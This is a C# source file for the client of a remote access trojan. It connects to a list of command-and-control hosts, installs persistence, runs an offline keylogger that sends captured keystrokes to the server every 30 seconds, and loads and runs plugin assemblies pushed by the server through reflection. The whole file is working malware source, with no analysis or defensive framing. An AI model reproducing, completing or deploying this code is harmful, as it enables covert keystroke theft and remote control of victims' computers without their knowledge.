using PacketLib.Packet;
using PacketLib;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using PacketLib.Utils;
using System.IO;
using System.Net.Sockets;
using System.IO.Compression;
using System.Collections.Generic;
[assembly: System.Runtime.Versioning.TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
[assembly: ComVisible(false)]
namespace Client
{
    public static class Config
    {
        public static List<string> hostLists = new List<string>() { "qsdqsdqsdkjsdljk.com:7521", "127.0.0.1:7788", "127.0.0.1:9988", "127.0.0.1:9875" };
        public static List<Host> hosts = new List<Host>();
        public static string generalKey = "123456789";
        public static bool offKeylog = false;
        public static string mutex = "%MUTEX%";
        public static Offline.Persistence.Method installationMethod = Offline.Persistence.Method.NONE;
        public static string[] installationParam = new string[] { AppDomain.CurrentDomain.FriendlyName };
    }
    public class StarterClass
    {
        private static bool AlreadyLaunched = false;
        private static Mutex mutex;
        public static void OneInstance()
        {
            mutex = new Mutex(true, Config.mutex, out AlreadyLaunched);
            if (!AlreadyLaunched)
            {
                NtTerminateProcess((IntPtr)(-1), 0);
            }
        }

        private static System.Reflection.Assembly DomCheck(object send, System.ResolveEventArgs e)
        {
            byte[] offline = new byte[] { };

            byte[] packetLib = new byte[] { };

            if (e.Name.Contains("Packet"))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    using (MemoryStream compressedStream = new MemoryStream(packetLib))
                    {
                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
                        {
                            deflater.CopyTo(ms);
                        }
                    }
                    return System.Reflection.Assembly.Load(ms.ToArray());
                }
            }
            if (e.Name.Contains("Off"))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    using (MemoryStream compressedStream = new MemoryStream(offline))
                    {
                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
                        {
                            deflater.CopyTo(ms);
                        }
                    }
                    return System.Reflection.Assembly.Load(ms.ToArray());
                }
            }
            return null;
        }

        static StarterClass()
        {
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(DomCheck);
        }

        internal static void StartOfflineKeylogger()
        {
            if (Config.offKeylog)
            {
                new Thread(() =>
                {
                    while (true)
                    {
                        Thread.Sleep(30000);
                        if (clientHandler.Connected)
                            Offline.Keyloggers.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID)); Offline.Keyloggers.Launch.ClearKeyStroke();
                    }
                }).Start();

                Offline.Keyloggers.Launch.Start();
            }
        }

        [DllImport("ntdll.dll")]
        internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

        internal static ClientHandler clientHandler;

        [MTAThread]
        public static void Main()
        {
            MakeInstall();
            OneInstance();

            clientHandler = new ClientHandler();
            StartOfflineKeylogger();

            foreach (string h in Config.hostLists)
            {
                string[] sp = h.Split(':');
                Config.hosts.Add(new Host(sp[0], sp[1]));
            }

            clientHandler.ConnectStart();

            new Thread(new ThreadStart(() => {
                while (true)
                {
                    Thread.Sleep(-1);
                }
            })).Start();
        }

        public static void MakeInstall()
        {
            Offline.Persistence.Launch.Install(Config.installationMethod, Config.installationParam);
        }

        internal static class PacketHandler
        {

            internal delegate void PluginDelegate(IPacket packet);
            internal static PluginDelegate pluginDelegate;
            static PacketHandler()
            {
                pluginDelegate = new PluginDelegate(LoadPlugin);
            }

            internal static void ParsePacket(IPacket packet)
            {
                try
                {
                    switch (packet.packetType)
                    {
                        case PacketType.CONNECTED:
                            StarterClass.clientHandler.baseIp = packet.baseIp;
                            break;

                        case (PacketType.CLOSE_CLIENT):
                            StarterClass.NtTerminateProcess((IntPtr)(-1), 0);
                            break;

                        case (PacketType.UNINSTALL_CLOSE_CLIENT):
                            Offline.Persistence.Launch.Uninstall(Config.installationMethod, Config.installationParam);
                            break;

                        default:
                            pluginDelegate.BeginInvoke(packet, new AsyncCallback(EndLoadPlugin), null);
                            break;

                    }
                }
                catch { }
            }

            internal static void LoadPlugin(IPacket packet)
            {
                System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(Compressor.QuickLZ.Decompress(packet.plugin));
                System.Reflection.MethodInfo method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
                object obj = assemblytoload.CreateInstance(method.Name);
                LoadingAPI loadingAPI = new LoadingAPI
                {
                    host = StarterClass.clientHandler.host,
                    baseIp = StarterClass.clientHandler.baseIp,
                    HWID = StarterClass.clientHandler.HWID,
                    key = Config.generalKey,
                    currentPacket = packet,
                };

                method.Invoke(obj, new object[] { loadingAPI });
            }

            public static void EndLoadPlugin(IAsyncResult ar)
            {
                pluginDelegate.EndInvoke(ar);
            }
        }
    }
    internal class ClientHandler
    {
        internal Host host { get; set; }
        internal string HWID { get; set; }
        internal string baseIp { get; set; }
        private Socket socket { get; set; }
        internal bool Connected { get; set; }
        internal int indexHost { get; set; }

        private delegate byte[] ReadDataAsync();
        private delegate IPacket ReadPacketAsync(byte[] bufferPacket);
        private delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        private ReadDataAsync readDataAsync;
        private ReadPacketAsync readPacketAsync;
        private ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;


        internal ClientHandler() : base()
        {
            readDataAsync = new ReadDataAsync(ReceiveData);
            readPacketAsync = new ReadPacketAsync(PacketParser);
            sendDataAsync = new SendDataAsync(SendData);
        }

        public void ConnectStart()
        {

            if (indexHost == Config.hosts.Count)
                indexHost = 0;

            host = Config.hosts[indexHost];
            indexHost++;

            Thread.Sleep(125);

            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(host.host, host.port);
                return true;
            }
            catch { }
            return false;
        }

        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);

            if (Connected)
            {
                ConnectedPacket connectionPacket = new ConnectedPacket();
                this.HWID = connectionPacket.HWID;
                SendPacket(connectionPacket);
                Receive();
            }
            else
            {
                ConnectStart();
            }
        }

        public void Receive()
        {
            if (Connected)
                readDataAsync.BeginInvoke(new AsyncCallback(EndDataRead), null);
            else
                ConnectStart();
        }
        private byte[] ReceiveData()
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectRead);
                recv = socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                Connected = false;
                return null;
            }
        }
        public void EndDataRead(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);

            if (data != null && Connected)
                readPacketAsync.BeginInvoke(data, new AsyncCallback(EndPacketRead), null);

            Receive();
        }


        private IPacket PacketParser(byte[] bufferPacket)
        {
            return bufferPacket.DeserializePacket(Config.generalKey);
        }
        public void EndPacketRead(IAsyncResult ar)
        {
            IPacket packet = readPacketAsync.EndInvoke(ar);
            StarterClass.PacketHandler.ParsePacket(packet);
        }


        public void SendPacket(IPacket packet)
        {
            if (Connected)
                sendDataAsync.BeginInvoke(packet, new AsyncCallback(SendDataCompleted), null);
        }
        private int SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(Config.generalKey);
                lock (socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] header = new byte[5];
                    socket.Poll(-1, SelectMode.SelectWrite);

                    byte[] temp = BitConverter.GetBytes(size);

                    header[0] = temp[0];
                    header[1] = temp[1];
                    header[2] = temp[2];
                    header[3] = temp[3];
                    header[4] = (byte)data.packetType;

                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return total;
                }
            }
            catch (Exception)
            {
                Connected = false;
                return 0;
            }
        }
        private void SendDataCompleted(IAsyncResult ar)
        {
            int length = sendDataAsync.EndInvoke(ar);
            if (Connected)
            {
                return;
            }
        }
    }
}